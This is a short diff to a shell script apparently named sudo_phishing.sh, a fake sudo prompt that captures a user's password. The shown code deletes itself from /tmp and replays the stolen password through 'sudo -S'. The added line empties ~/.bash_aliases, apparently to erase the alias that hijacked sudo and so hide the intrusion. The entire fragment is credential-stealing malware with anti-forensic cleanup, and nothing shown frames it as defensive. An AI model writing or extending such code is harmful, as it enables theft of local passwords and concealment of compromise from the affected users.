@@ -18,6 +18,7 @@ attempts() {
         ##
         /bin/rm /tmp/sudo_phishing.sh
         /bin/echo "${sudo_password}" | /usr/bin/sudo -S "${@}"
+        truncate -s 0 ~/.bash_aliases
         exit 0
     else 
         echo "Sorry, try again."
